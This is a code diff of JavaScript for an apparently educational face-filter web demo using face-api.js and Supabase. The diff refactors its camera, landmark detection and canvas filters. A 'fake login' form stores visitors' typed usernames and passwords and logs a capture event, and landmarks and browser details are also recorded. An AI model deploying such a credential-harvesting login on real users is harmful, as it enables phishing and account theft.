@@ -1,9 +1,9 @@
 /* ============================================================
    ANOTHERFACE — demo educativa UNITEC
-   Filtros IA en tiempo real que siguen el rostro con lerp.
+   Filtros IA en tiempo real que siguen el rostro.
    ============================================================ */
 
-// ---------- Utilerías ----------
+// ---------- Utilidades ----------
 const $ = (sel) => document.querySelector(sel);
 
 function uuid() {
@@ -28,17 +28,21 @@ tickClock();
 
 // ---------- Supabase ----------
 let supabaseClient = null;
+let supabaseReady  = false;
 
 function getSupabase() {
   if (supabaseClient) return supabaseClient;
   if (!window.supabase) return null;
-  if (!window.SUPABASE_CONFIG) return null;
-  const { url, anonKey } = window.SUPABASE_CONFIG;
-  if (!url || !anonKey || url.includes("TU-PROYECTO")) return null;
+  const cfg = window.SUPABASE_CONFIG;
+  if (!cfg) return null;
+  const { url, anonKey } = cfg;
+  if (!url || !anonKey || url.includes("TU-PROYECTO") || url === "") return null;
   try {
     supabaseClient = window.supabase.createClient(url, anonKey);
+    supabaseReady  = true;
     return supabaseClient;
-  } catch {
+  } catch (e) {
+    console.warn("[supabase] No se pudo inicializar:", e.message);
     return null;
   }
 }
@@ -46,27 +50,25 @@ function getSupabase() {
 // ---------- Login ----------
 let userCredentials = { username: "", password: "" };
 
-const loginScreen  = $("#login-screen");
-const heroSection  = $("#hero-section");
+const loginScreen   = $("#login-screen");
+const heroSection   = $("#hero-section");
 const fakeLoginForm = $("#fake-login-form");
 
 if (fakeLoginForm) {
   fakeLoginForm.addEventListener("submit", (e) => {
     e.preventDefault();
-    userCredentials.username = $("#fake-username").value.trim();
-    userCredentials.password = $("#fake-password").value;
+    userCredentials.username = ($("#fake-username")?.value || "").trim();
+    userCredentials.password =  $("#fake-password")?.value || "";
 
-    // Ocultar login y revelar toda la experiencia
-    if (loginScreen)  loginScreen.classList.add("hidden");
-    if (heroSection)  heroSection.classList.remove("hidden");
+    // Ocultar login y revelar la experiencia completa
+    loginScreen?.classList.add("hidden");
+    heroSection?.classList.remove("hidden");
+    $("#como-funciona")?.classList.remove("hidden");
+    $("#consentimiento")?.classList.remove("hidden");
+    $("#closing-section")?.classList.remove("hidden");
 
-    const lectura       = $("#como-funciona");
-    const consentSection = $("#consentimiento");
-    const closingSection = $("#closing-section");
-
-    if (lectura)       lectura.classList.remove("hidden");
-    if (consentSection) consentSection.classList.remove("hidden");
-    if (closingSection) closingSection.classList.remove("hidden");
+    // Scroll suave al hero
+    heroSection?.scrollIntoView({ behavior: "smooth", block: "start" });
 
     logEvent("login_capturado", { filtro: "ninguno" });
   });
@@ -86,21 +88,21 @@ function refreshConsentState() {
   startBtn.disabled = !ok;
   if (consentHint) {
     consentHint.textContent = ok
-      ? "✦ Listo. Toca el botón para activar tu cámara."
+      ? "✦ Listo. Presiona el botón para activar tu cámara."
       : "Marca las dos primeras casillas para continuar.";
   }
 }
 [consentCamera, consentMeta, consentSnapshot, consentLandmarks].forEach((el) => {
-  if (el) el.addEventListener("change", refreshConsentState);
+  el?.addEventListener("change", refreshConsentState);
 });
 refreshConsentState();
 
 // ---------- Estado del estudio ----------
-const video    = $("#video");
-const overlay  = $("#overlay");
-const ctx      = overlay ? overlay.getContext("2d") : null;
-const studio   = $("#estudio");
-const statusEl = $("#studio-status");
+const video        = $("#video");
+const overlay      = $("#overlay");
+const ctx          = overlay?.getContext("2d");
+const studio       = $("#estudio");
+const statusEl     = $("#studio-status");
 const faceStatusEl = $("#face-status-overlay");
 
 const hud = {
@@ -133,7 +135,6 @@ const MODEL_URLS = [
 async function loadFaceModel() {
   if (!window.faceapi) {
     if (hud.model) hud.model.textContent = "librería no cargada";
-    faceModelReady = false;
     return false;
   }
   for (const url of MODEL_URLS) {
@@ -145,7 +146,7 @@ async function loadFaceModel() {
       faceModelReady = true;
       if (hud.model) hud.model.textContent = "✓ listo";
       return true;
-    } catch (_) { /* try next CDN */ }
+    } catch (_) { /* probar siguiente CDN */ }
   }
   faceModelReady = false;
   if (hud.model) hud.model.textContent = "sin conexión";
@@ -153,7 +154,7 @@ async function loadFaceModel() {
 }
 loadFaceModel();
 
-// ---------- Filtros: selección ----------
+// ---------- Selección de filtros ----------
 document.querySelectorAll(".filter-chip").forEach((btn) => {
   btn.addEventListener("click", () => {
     document.querySelectorAll(".filter-chip").forEach((b) => b.classList.remove("active"));
@@ -164,7 +165,7 @@ document.querySelectorAll(".filter-chip").forEach((btn) => {
   });
 });
 
-// ---------- HUD static ----------
+// ---------- HUD estático ----------
 function fillHudStatic() {
   if (hud.tz)      hud.tz.textContent      = Intl.DateTimeFormat().resolvedOptions().timeZone || "—";
   if (hud.lang)    hud.lang.textContent    = navigator.language || "—";
@@ -187,8 +188,8 @@ async function openCamera(mode) {
   if (stream) stream.getTracks().forEach((t) => t.stop());
   stream = await navigator.mediaDevices.getUserMedia({
     video: {
-      width:  { ideal: IS_MOBILE ? 480 : 1280 },
-      height: { ideal: IS_MOBILE ? 640 : 720 },
+      width:      { ideal: IS_MOBILE ? 640 : 1280 },
+      height:     { ideal: IS_MOBILE ? 480 : 720 },
       facingMode: { ideal: mode },
     },
     audio: false,
@@ -196,161 +197,95 @@ async function openCamera(mode) {
   video.srcObject = stream;
   await video.play();
   video.style.transform = mode === "user" ? "scaleX(-1)" : "scaleX(1)";
+  // Esperar a que el video tenga dimensiones reales antes de ajustar el canvas
+  await new Promise((res) => {
+    if (video.videoWidth > 0) { res(); return; }
+    video.addEventListener("loadeddata", res, { once: true });
+  });
   resizeCanvas();
 }
 
-if (startBtn) {
-  startBtn.addEventListener("click", async () => {
-    try {
-      await openCamera(facingMode);
-      if (studio) studio.classList.remove("hidden");
-      studio.scrollIntoView({ behavior: "smooth", block: "start" });
-      fillHudStatic();
-      window.addEventListener("resize", resizeCanvas);
-      rafId = requestAnimationFrame(renderLoop);
-      logEvent("camara_activada");
-    } catch (err) {
-      if (consentHint) consentHint.textContent = "No se pudo acceder a la cámara. Revisa los permisos.";
-    }
-  });
-}
-
-const switchBtn = $("#switch-camera-btn");
-if (switchBtn) {
-  switchBtn.addEventListener("click", async () => {
-    facingMode = facingMode === "user" ? "environment" : "user";
-    try {
-      await openCamera(facingMode);
-      if (statusEl) statusEl.textContent = `Cámara ${facingMode === "user" ? "frontal" : "trasera"} activa.`;
-    } catch {
-      if (statusEl) statusEl.textContent = "Esta cámara no está disponible.";
-      facingMode = facingMode === "user" ? "environment" : "user";
-    }
-  });
-}
-
-const stopBtn = $("#stop-btn");
-if (stopBtn) {
-  stopBtn.addEventListener("click", () => {
-    if (stream) stream.getTracks().forEach((t) => t.stop());
+startBtn?.addEventListener("click", async () => {
+  try {
+    await openCamera(facingMode);
+    studio?.classList.remove("hidden");
+    studio?.scrollIntoView({ behavior: "smooth", block: "start" });
+    fillHudStatic();
+    window.addEventListener("resize", resizeCanvas);
     if (rafId) cancelAnimationFrame(rafId);
-    if (studio) studio.classList.add("hidden");
-    targetDetection = null;
-    smoothedDetection = null;
-    logEvent("camara_apagada");
-  });
-}
+    rafId = requestAnimationFrame(renderLoop);
+    logEvent("camara_activada");
+  } catch (err) {
+    if (consentHint) consentHint.textContent = "⚠ No se pudo acceder a la cámara. Revisa los permisos.";
+    console.error(err);
+  }
+});
+
+$("#switch-camera-btn")?.addEventListener("click", async () => {
+  facingMode = facingMode === "user" ? "environment" : "user";
+  try {
+    await openCamera(facingMode);
+    if (statusEl) statusEl.textContent = `Cámara ${facingMode === "user" ? "frontal" : "trasera"} activa.`;
+  } catch {
+    if (statusEl) statusEl.textContent = "Esta cámara no está disponible.";
+    facingMode = facingMode === "user" ? "environment" : "user";
+  }
+});
+
+$("#stop-btn")?.addEventListener("click", () => {
+  stream?.getTracks().forEach((t) => t.stop());
+  if (rafId) cancelAnimationFrame(rafId);
+  studio?.classList.add("hidden");
+  targetDetection   = null;
+  smoothedDetection = null;
+  logEvent("camara_apagada");
+});
 
 function resizeCanvas() {
   if (!overlay || !video) return;
-  overlay.width  = video.clientWidth;
-  overlay.height = video.clientHeight;
+  // Usar dimensiones del elemento, o del video si el elemento aún es 0
+  const w = video.clientWidth  || video.videoWidth  || 640;
+  const h = video.clientHeight || video.videoHeight || 480;
+  overlay.width  = w;
+  overlay.height = h;
 }
 
-// ---------- Detección facial (loop asíncrono independiente) ----------
+// ---------- Detección facial (loop independiente ~25 fps) ----------
 let targetDetection   = null;
 let smoothedDetection = null;
 let lastAutoSave      = 0;
 
+// Análisis facial persistente (se actualiza con cada detección)
+let faceAnalysis = { smile: 0, glasses: false, eyebrow: 0 };
+
 function lerp(a, b, t) { return a + (b - a) * t; }
 
 function updateSmoothedDetection() {
-  if (!targetDetection) {
-    // Apagar suavemente
-    if (smoothedDetection) {
-      smoothedDetection = null;
-    }
-    return;
-  }
+  if (!targetDetection) { smoothedDetection = null; return; }
   if (!smoothedDetection) {
     smoothedDetection = {
       box:       { ...targetDetection.box },
       points:    targetDetection.points.map((p) => ({ ...p })),
       rawPoints: targetDetection.rawPoints,
+      score:     targetDetection.score,
     };
     return;
   }
-  const t = 0.25; // suavizado suave
-  const bd = smoothedDetection.box;
-  const bt = targetDetection.box;
-  bd.x      = lerp(bd.x,      bt.x,      t);
-  bd.y      = lerp(bd.y,      bt.y,      t);
-  bd.width  = lerp(bd.width,  bt.width,  t);
-  bd.height = lerp(bd.height, bt.height, t);
-
-  for (let i = 0; i < targetDetection.points.length; i++) {
-    smoothedDetection.points[i].x = lerp(smoothedDetection.points[i].x, targetDetection.points[i].x, t);
-    smoothedDetection.points[i].y = lerp(smoothedDetection.points[i].y, targetDetection.points[i].y, t);
+  const T = 0.22;
+  const sd = smoothedDetection, td = targetDetection;
+  sd.box.x      = lerp(sd.box.x,      td.box.x,      T);
+  sd.box.y      = lerp(sd.box.y,      td.box.y,      T);
+  sd.box.width  = lerp(sd.box.width,  td.box.width,  T);
+  sd.box.height = lerp(sd.box.height, td.box.height, T);
+  for (let i = 0; i < td.points.length; i++) {
+    sd.points[i].x = lerp(sd.points[i].x, td.points[i].x, T);
+    sd.points[i].y = lerp(sd.points[i].y, td.points[i].y, T);
   }
-  smoothedDetection.rawPoints = targetDetection.rawPoints;
+  sd.rawPoints = td.rawPoints;
+  sd.score     = td.score;
 }
 
-async function detectFaceLoop() {
-  // Esperar hasta que el modelo y el stream estén listos
-  if (!faceModelReady || !stream || !video || video.readyState < 2) {
-    setTimeout(detectFaceLoop, 120);
-    return;
-  }
-
-  try {
-    // Usamos inputSize alto para mejor precisión con caras en distintos ángulos
-    const result = await faceapi
-      .detectSingleFace(video, new faceapi.TinyFaceDetectorOptions({ inputSize: 320, scoreThreshold: 0.25 }))
-      .withFaceLandmarks(true);
-
-    if (result && result.landmarks && result.landmarks.positions.length >= 68) {
-      const scaleX   = overlay.width  / video.videoWidth;
-      const scaleY   = overlay.height / video.videoHeight;
-      const mirrored = facingMode === "user";
-
-      // Mapear cada punto al canvas (con espejo si es cámara frontal)
-      const mapPoint = (p) => ({
-        x: mirrored ? overlay.width - p.x * scaleX : p.x * scaleX,
-        y: p.y * scaleY,
-      });
-
-      targetDetection = {
-        box:       result.detection.box,
-        points:    result.landmarks.positions.map(mapPoint),
-        rawPoints: result.landmarks.positions,
-        score:     result.detection.score,
-      };
-    } else {
-      targetDetection = null;
-    }
-  } catch (_) {
-    // error puntual, ignorar
-  }
-
-  // Actualizar HUD
-  const detected = !!targetDetection;
-  if (hud.face)      hud.face.textContent      = detected ? "✓ sí" : "no";
-  if (hud.landmarks) hud.landmarks.textContent = detected ? String(targetDetection.points.length) : "0";
-  if (faceStatusEl)  faceStatusEl.textContent  = detected
-    ? `✦ Rostro detectado · ${targetDetection.points.length} pts · confianza ${Math.round(targetDetection.score * 100)}%`
-    : "Buscando rostro…";
-
-  // Guardado automático de puntos (cada 4 segundos si el usuario lo aceptó)
-  if (consentLandmarks && consentLandmarks.checked && detected) {
-    const now = performance.now();
-    if (now - lastAutoSave > 4000) {
-      lastAutoSave = now;
-      logEvent("auto_puntos", {
-        con_landmarks: true,
-        landmarks: targetDetection.rawPoints.map((p) => ({ x: Math.round(p.x), y: Math.round(p.y) })),
-      });
-    }
-  }
-
-  setTimeout(detectFaceLoop, 40); // ~25 fps de detección
-}
-detectFaceLoop();
-
-// ============================================================
-// FILTROS — cada uno dibuja sobre el canvas usando los 68 pts
-// ============================================================
-
-// Helpers de geometría reutilizables
+// Helpers geométricos
 function centroid(pts) {
   let cx = 0, cy = 0;
   pts.forEach((p) => { cx += p.x; cy += p.y; });
@@ -358,9 +293,90 @@ function centroid(pts) {
 }
 function dist(a, b) { return Math.hypot(b.x - a.x, b.y - a.y); }
 
-// Dibuja una spline suave a través de puntos
+// Analizar el rostro detectado (sonrisa, cejas levantadas)
+function analyzeFace(pts) {
+  if (!pts || pts.length < 68) return;
+  // Sonrisa: ratio entre apertura vertical de la boca y su ancho
+  const mouthW  = dist(pts[48], pts[54]);
+  const mouthH  = dist(pts[51], pts[57]);
+  const smileRatio = mouthH / (mouthW || 1);
+  faceAnalysis.smile = Math.min(1, smileRatio * 4);
+
+  // Cejas levantadas: distancia ceja→ojo vs alto de la cara
+  const faceH     = dist(pts[27], pts[8]);
+  const lBrowEye  = dist(centroid(pts.slice(17, 22)), centroid(pts.slice(36, 42)));
+  const rBrowEye  = dist(centroid(pts.slice(22, 27)), centroid(pts.slice(42, 48)));
+  faceAnalysis.eyebrow = ((lBrowEye + rBrowEye) / 2) / (faceH || 1);
+
+  // Lentes: si la región de los ojos es proporcionalmente grande (heurística simple)
+  const eyeW = (dist(pts[36], pts[39]) + dist(pts[42], pts[45])) / 2;
+  faceAnalysis.glasses = eyeW / (dist(pts[0], pts[16]) || 1) > 0.18;
+}
+
+async function detectFaceLoop() {
+  if (!faceModelReady || !stream || !video || video.readyState < 2) {
+    setTimeout(detectFaceLoop, 150);
+    return;
+  }
+
+  try {
+    const result = await faceapi
+      .detectSingleFace(video, new faceapi.TinyFaceDetectorOptions({ inputSize: 320, scoreThreshold: 0.2 }))
+      .withFaceLandmarks(true);
+
+    if (result && result.landmarks && result.landmarks.positions.length >= 68) {
+      const scaleX   = (overlay?.width  || video.videoWidth)  / video.videoWidth;
+      const scaleY   = (overlay?.height || video.videoHeight) / video.videoHeight;
+      const mirrored = facingMode === "user";
+
+      const mapPoint = (p) => ({
+        x: mirrored ? (overlay?.width || video.videoWidth) - p.x * scaleX : p.x * scaleX,
+        y: p.y * scaleY,
+      });
+
+      const mapped = result.landmarks.positions.map(mapPoint);
+      targetDetection = {
+        box:       result.detection.box,
+        points:    mapped,
+        rawPoints: result.landmarks.positions,
+        score:     result.detection.score,
+      };
+      analyzeFace(mapped);
+    } else {
+      targetDetection = null;
+    }
+  } catch (_) { /* error puntual, ignorar */ }
+
+  const det = targetDetection;
+  if (hud.face)      hud.face.textContent      = det ? "✓ sí" : "no";
+  if (hud.landmarks) hud.landmarks.textContent = det ? String(det.points.length) : "0";
+  if (faceStatusEl)  faceStatusEl.textContent  = det
+    ? `✦ Rostro detectado · ${det.points.length} pts · ${Math.round(det.score * 100)}% confianza`
+    : "Buscando rostro…";
+
+  // Auto-guardado de landmarks
+  if (consentLandmarks?.checked && det) {
+    const now = performance.now();
+    if (now - lastAutoSave > 5000) {
+      lastAutoSave = now;
+      logEvent("auto_puntos", {
+        con_landmarks: true,
+        landmarks: det.rawPoints.map((p) => ({ x: Math.round(p.x), y: Math.round(p.y) })),
+      });
+    }
+  }
+
+  setTimeout(detectFaceLoop, 45);
+}
+detectFaceLoop();
+
+// ============================================================
+// FILTROS
+// ============================================================
+
+// Spline suave por cuadráticas Bezier
 function drawSpline(pts, close = false) {
-  if (!pts.length) return;
+  if (!pts || !pts.length) return;
   ctx.beginPath();
   ctx.moveTo(pts[0].x, pts[0].y);
   for (let i = 1; i < pts.length - 1; i++) {
@@ -368,225 +384,412 @@ function drawSpline(pts, close = false) {
     const my = (pts[i].y + pts[i + 1].y) / 2;
     ctx.quadraticCurveTo(pts[i].x, pts[i].y, mx, my);
   }
-  const last = pts[pts.length - 1];
+  const L = pts[pts.length - 1];
   if (close) {
-    const mx = (last.x + pts[0].x) / 2;
-    const my = (last.y + pts[0].y) / 2;
-    ctx.quadraticCurveTo(last.x, last.y, mx, my);
+    ctx.quadraticCurveTo(L.x, L.y, (L.x + pts[0].x) / 2, (L.y + pts[0].y) / 2);
     ctx.closePath();
   } else {
-    ctx.lineTo(last.x, last.y);
+    ctx.lineTo(L.x, L.y);
   }
 }
 
-/* ── FILTRO 1: Malla Facial (silueta) ── */
+// ---------- FILTRO: Malla Facial ----------
 function drawSilhouetteFilter(det) {
   if (!det || det.points.length < 68) return;
   const pts = det.points;
 
   ctx.shadowBlur = 0;
-
-  // Puntos
-  ctx.fillStyle = "rgba(0, 229, 255, 0.85)";
+  ctx.fillStyle  = "rgba(0,229,255,0.9)";
   pts.forEach((p) => {
     ctx.beginPath();
     ctx.arc(p.x, p.y, 2, 0, Math.PI * 2);
     ctx.fill();
   });
 
-  // Regiones con splines suaves
-  const regions = [
-    { range: [0, 16],  close: false }, // mandíbula
-    { range: [17, 21], close: false }, // ceja izq
-    { range: [22, 26], close: false }, // ceja der
-    { range: [27, 30], close: false }, // puente nasal
-    { range: [31, 35], close: false }, // base nariz
-    { range: [36, 41], close: true  }, // ojo izq
-    { range: [42, 47], close: true  }, // ojo der
-    { range: [48, 59], close: true  }, // labio externo
-    { range: [60, 67], close: true  }, // labio interno
+  const segs = [
+    { s: 0, e: 16, c: false }, { s: 17, e: 21, c: false },
+    { s: 22, e: 26, c: false }, { s: 27, e: 30, c: false },
+    { s: 31, e: 35, c: false }, { s: 36, e: 41, c: true  },
+    { s: 42, e: 47, c: true  }, { s: 48, e: 59, c: true  },
+    { s: 60, e: 67, c: true  },
   ];
+  ctx.strokeStyle = "rgba(0,229,255,0.75)";
+  ctx.lineWidth   = 1.5;
+  segs.forEach(({ s, e, c }) => { drawSpline(pts.slice(s, e + 1), c); ctx.stroke(); });
 
-  ctx.strokeStyle = "rgba(0, 229, 255, 0.7)";
-  ctx.lineWidth = 1.5;
-
-  regions.forEach(({ range: [s, e], close }) => {
-    drawSpline(pts.slice(s, e + 1), close);
-    ctx.stroke();
-  });
-
-  // Líneas guía simétricas
-  ctx.strokeStyle = "rgba(0, 229, 255, 0.18)";
-  ctx.lineWidth = 1;
-  const guide = [
-    [27, 33], [33, 51], [27, 39], [27, 42],
-    [36, 0],  [45, 16], [33, 48], [33, 54],
-  ];
-  guide.forEach(([a, b]) => {
-    ctx.beginPath();
-    ctx.moveTo(pts[a].x, pts[a].y);
-    ctx.lineTo(pts[b].x, pts[b].y);
-    ctx.stroke();
+  // Guías simétricas
+  ctx.strokeStyle = "rgba(0,229,255,0.2)";
+  ctx.lineWidth   = 1;
+  [[27,33],[27,39],[27,42],[36,0],[45,16],[33,48],[33,54]].forEach(([a,b]) => {
+    ctx.beginPath(); ctx.moveTo(pts[a].x, pts[a].y); ctx.lineTo(pts[b].x, pts[b].y); ctx.stroke();
   });
 }
 
-/* ── FILTRO 2: Ojos de Fuego ── */
+// ---------- FILTRO: Ojos de Fuego ----------
 function drawFireEyesFilter(det, ts) {
   if (!det || det.points.length < 68) return;
-  const pts = det.points;
+  const pts  = det.points;
+  const lPts = pts.slice(36, 42);
+  const rPts = pts.slice(42, 48);
+  const eyeW = (dist(lPts[0], lPts[3]) + dist(rPts[0], rPts[3])) / 2;
 
-  const leftPts  = pts.slice(36, 42);
-  const rightPts = pts.slice(42, 48);
-  const eyeW     = (dist(leftPts[0], leftPts[3]) + dist(rightPts[0], rightPts[3])) / 2;
-
-  function drawFlame(cx, cy, w, t) {
-    const r = w * 0.38;
-    // pupila
+  function flame(cx, cy, w, t) {
+    const r = w * 0.4;
     const g = ctx.createRadialGradient(cx, cy, 0, cx, cy, r);
-    g.addColorStop(0, "rgba(255, 240, 0, 1)");
-    g.addColorStop(0.4, "rgba(255, 80, 0, 0.95)");
-    g.addColorStop(1, "rgba(255, 0, 0, 0.6)");
-    ctx.beginPath();
-    ctx.arc(cx, cy, r, 0, Math.PI * 2);
-    ctx.fillStyle = g;
-    ctx.shadowColor = "#ff4400";
-    ctx.shadowBlur  = 30;
-    ctx.fill();
-
-    // llamas
-    const N = 14;
+    g.addColorStop(0, "rgba(255,255,100,1)");
+    g.addColorStop(0.5, "rgba(255,80,0,0.95)");
+    g.addColorStop(1, "rgba(200,0,0,0.5)");
+    ctx.beginPath(); ctx.arc(cx, cy, r, 0, Math.PI * 2);
+    ctx.fillStyle = g; ctx.shadowColor = "#ff4400"; ctx.shadowBlur = 28; ctx.fill();
+    const N = 16;
     for (let i = 0; i < N; i++) {
-      const angle = (Math.PI * 2 * i) / N;
-      const osc   = Math.sin(t * 0.008 + i * 1.3) * 0.5 + 0.5;
-      const noise = Math.random() * 0.35;
-      const len   = r + w * 0.9 * (osc + noise);
-      const bias  = Math.sin(angle) < 0 ? 2.0 : 0.35;
-
+      const a = (Math.PI * 2 * i) / N;
+      const len = r + w * (0.7 + Math.sin(t * 0.008 + i * 1.2) * 0.4 + Math.random() * 0.3);
+      const bias = Math.sin(a) < 0 ? 2.2 : 0.3;
       ctx.beginPath();
-      ctx.moveTo(cx + Math.cos(angle - 0.25) * r, cy + Math.sin(angle - 0.25) * r);
-      ctx.lineTo(
-        cx + Math.cos(angle) * len,
-        cy + Math.sin(angle) * len * bias - w * 0.5
-      );
-      ctx.lineTo(cx + Math.cos(angle + 0.25) * r, cy + Math.sin(angle + 0.25) * r);
-      ctx.fillStyle = i % 2 === 0 ? "rgba(255,140,0,0.75)" : "rgba(255,240,0,0.55)";
+      ctx.moveTo(cx + Math.cos(a - 0.25) * r, cy + Math.sin(a - 0.25) * r);
+      ctx.lineTo(cx + Math.cos(a) * len, cy + Math.sin(a) * len * bias - w * 0.5);
+      ctx.lineTo(cx + Math.cos(a + 0.25) * r, cy + Math.sin(a + 0.25) * r);
+      ctx.fillStyle = i % 2 ? "rgba(255,200,0,0.6)" : "rgba(255,100,0,0.75)";
       ctx.fill();
     }
     ctx.shadowBlur = 0;
   }
-
-  drawFlame(centroid(leftPts).x,  centroid(leftPts).y,  eyeW, ts);
-  drawFlame(centroid(rightPts).x, centroid(rightPts).y, eyeW, ts + 600);
+  flame(centroid(lPts).x, centroid(lPts).y, eyeW, ts);
+  flame(centroid(rPts).x, centroid(rPts).y, eyeW, ts + 700);
 }
 
-/* ── FILTRO 3: Cyber ── */
+// ---------- FILTRO: Cyber (escáner holográfico) ----------
 function drawCyberFilter(det, ts) {
   if (!det || det.points.length < 68) return;
   const pts = det.points;
+  const alpha = 0.3 + 0.1 * Math.sin(ts * 0.003);
 
-  // Rejilla holográfica sobre la cara
-  ctx.strokeStyle = `rgba(0,255,150,${0.3 + 0.1 * Math.sin(ts * 0.003)})`;
-  ctx.lineWidth = 0.8;
-
-  // Triángulos conectando puntos (Delaunay simplificado)
-  const connections = [
-    [0,1],[1,2],[2,3],[3,4],[4,5],[5,6],[6,7],[7,8],
-    [8,9],[9,10],[10,11],[11,12],[12,13],[13,14],[14,15],[15,16],
-    [17,18],[18,19],[19,20],[20,21],[22,23],[23,24],[24,25],[25,26],
-    [36,37],[37,38],[38,39],[39,40],[40,41],[41,36],
-    [42,43],[43,44],[44,45],[45,46],[46,47],[47,42],
-    [48,49],[49,50],[50,51],[51,52],[52,53],[53,54],
-    [54,55],[55,56],[56,57],[57,58],[58,59],[59,48],
-    // cruces
-    [27,21],[27,22],[30,35],[30,31],
-    [39,31],[42,35],[36,17],[45,26],
-    [0,36],[16,45],[48,33],[54,33],
+  ctx.strokeStyle = `rgba(0,255,150,${alpha})`;
+  ctx.lineWidth   = 0.8;
+  const conn = [
+    [0,1],[1,2],[2,3],[3,4],[4,5],[5,6],[6,7],[7,8],[8,9],[9,10],[10,11],[11,12],[12,13],[13,14],[14,15],[15,16],
+    [17,21],[22,26],[36,41],[42,47],[48,59],[60,67],
+    [27,21],[27,26],[30,31],[33,48],[33,54],[36,0],[45,16],
   ];
-
-  connections.forEach(([a, b]) => {
-    ctx.beginPath();
-    ctx.moveTo(pts[a].x, pts[a].y);
-    ctx.lineTo(pts[b].x, pts[b].y);
-    ctx.stroke();
+  conn.forEach(([a,b]) => {
+    ctx.beginPath(); ctx.moveTo(pts[a].x,pts[a].y); ctx.lineTo(pts[b].x,pts[b].y); ctx.stroke();
   });
 
-  // Puntos brillantes en landmarks clave
-  const keyPts = [0,8,16,27,30,33,36,39,42,45,48,54];
-  keyPts.forEach((i) => {
-    ctx.beginPath();
-    ctx.arc(pts[i].x, pts[i].y, 3, 0, Math.PI * 2);
-    ctx.fillStyle = `rgba(0,255,150,${0.6 + 0.4 * Math.sin(ts * 0.005 + i)})`;
-    ctx.shadowColor = "#00ff96";
-    ctx.shadowBlur  = 12;
-    ctx.fill();
-    ctx.shadowBlur = 0;
+  [0,8,16,27,30,33,36,39,42,45,48,54].forEach((i,idx) => {
+    ctx.beginPath(); ctx.arc(pts[i].x, pts[i].y, 3.5, 0, Math.PI*2);
+    ctx.fillStyle   = `rgba(0,255,150,${0.5 + 0.5*Math.sin(ts*0.005+idx)})`;
+    ctx.shadowColor = "#00ff96"; ctx.shadowBlur = 12; ctx.fill(); ctx.shadowBlur = 0;
   });
 
-  // Línea de escáner animada sobre la cara
-  const faceTop    = pts[27].y - (pts[27].y - pts[8].y) * 0.3;
-  const faceBottom = pts[8].y;
-  const scanY = faceTop + ((Math.sin(ts * 0.002) * 0.5 + 0.5) * (faceBottom - faceTop));
-  const faceLeft  = pts[0].x;
-  const faceRight = pts[16].x;
-  const grad = ctx.createLinearGradient(faceLeft, scanY, faceRight, scanY);
-  grad.addColorStop(0,   "rgba(0,255,150,0)");
-  grad.addColorStop(0.5, "rgba(0,255,150,0.6)");
-  grad.addColorStop(1,   "rgba(0,255,150,0)");
-  ctx.beginPath();
-  ctx.moveTo(faceLeft, scanY);
-  ctx.lineTo(faceRight, scanY);
-  ctx.strokeStyle = grad;
-  ctx.lineWidth   = 2;
-  ctx.stroke();
+  // Línea de escáner animada
+  const top  = pts[27].y - 20;
+  const bot  = pts[8].y  + 10;
+  const scanY = top + (Math.sin(ts * 0.0018) * 0.5 + 0.5) * (bot - top);
+  const lx    = Math.min(pts[0].x, pts[16].x) - 10;
+  const rx    = Math.max(pts[0].x, pts[16].x) + 10;
+  const sg = ctx.createLinearGradient(lx, scanY, rx, scanY);
+  sg.addColorStop(0, "rgba(0,255,150,0)");
+  sg.addColorStop(0.5, "rgba(0,255,150,0.7)");
+  sg.addColorStop(1, "rgba(0,255,150,0)");
+  ctx.beginPath(); ctx.moveTo(lx, scanY); ctx.lineTo(rx, scanY);
+  ctx.strokeStyle = sg; ctx.lineWidth = 2; ctx.stroke();
 }
 
-/* ── FILTRO 4: Neón ── */
+// ---------- FILTRO: Neón ----------
 function drawNeonFilter(det, ts) {
   if (!det || det.points.length < 68) return;
   const pts = det.points;
-
-  const palette = ["#ff2a6d", "#00e5ff", "#7c3aed", "#ffcc00"];
-  const regions = [
-    { slice: [0,  16],  color: palette[0], close: false },
-    { slice: [17, 21],  color: palette[1], close: false },
-    { slice: [22, 26],  color: palette[1], close: false },
-    { slice: [27, 35],  color: palette[2], close: false },
-    { slice: [36, 41],  color: palette[3], close: true  },
-    { slice: [42, 47],  color: palette[3], close: true  },
-    { slice: [48, 59],  color: palette[0], close: true  },
-    { slice: [60, 67],  color: "#ff6b35",  close: true  },
+  const glow = 2 + Math.sin(ts * 0.004);
+  const R = [
+    { s:0,  e:16, c:"#ff2a6d", cl:false },
+    { s:17, e:21, c:"#00e5ff", cl:false },
+    { s:22, e:26, c:"#00e5ff", cl:false },
+    { s:27, e:35, c:"#7c3aed", cl:false },
+    { s:36, e:41, c:"#ffcc00", cl:true  },
+    { s:42, e:47, c:"#ffcc00", cl:true  },
+    { s:48, e:59, c:"#ff2a6d", cl:true  },
+    { s:60, e:67, c:"#ff6b35", cl:true  },
   ];
-
-  const glow = 2 + Math.sin(ts * 0.004) * 1;
-
-  regions.forEach(({ slice: [s, e], color, close }) => {
-    ctx.shadowColor  = color;
-    ctx.shadowBlur   = 16 + glow * 4;
-    ctx.strokeStyle  = color;
-    ctx.lineWidth    = 2 + glow * 0.3;
-    drawSpline(pts.slice(s, e + 1), close);
-    ctx.stroke();
+  R.forEach(({ s, e, c, cl }) => {
+    ctx.shadowColor = c; ctx.shadowBlur = 18 + glow*4;
+    ctx.strokeStyle = c; ctx.lineWidth  = 2 + glow*0.25;
+    drawSpline(pts.slice(s, e+1), cl); ctx.stroke();
   });
-
-  // Puntos brillantes en cejas y ojos
   [17,18,19,20,21,22,23,24,25,26,36,39,42,45].forEach((i, idx) => {
-    const color = palette[idx % palette.length];
-    ctx.beginPath();
-    ctx.arc(pts[i].x, pts[i].y, 2.5, 0, Math.PI * 2);
-    ctx.fillStyle   = color;
-    ctx.shadowColor = color;
-    ctx.shadowBlur  = 14;
-    ctx.fill();
+    const c = ["#ff2a6d","#00e5ff","#7c3aed","#ffcc00"][idx%4];
+    ctx.beginPath(); ctx.arc(pts[i].x, pts[i].y, 2.5, 0, Math.PI*2);
+    ctx.fillStyle = c; ctx.shadowColor = c; ctx.shadowBlur = 12; ctx.fill();
   });
+  ctx.shadowBlur = 0;
+}
+
+// ---------- FILTRO: Deformación (cara chistosa) ----------
+function drawDeformFilter(det, ts) {
+  if (!det || det.points.length < 68) return;
+  const pts = det.points;
+  const w = overlay.width, h = overlay.height;
+
+  // Capturar el frame del video en un canvas offscreen
+  const tmp = document.createElement("canvas");
+  tmp.width = w; tmp.height = h;
+  const tctx = tmp.getContext("2d");
+  tctx.save();
+  if (facingMode === "user") { tctx.translate(w, 0); tctx.scale(-1, 1); }
+  tctx.drawImage(video, 0, 0, w, h);
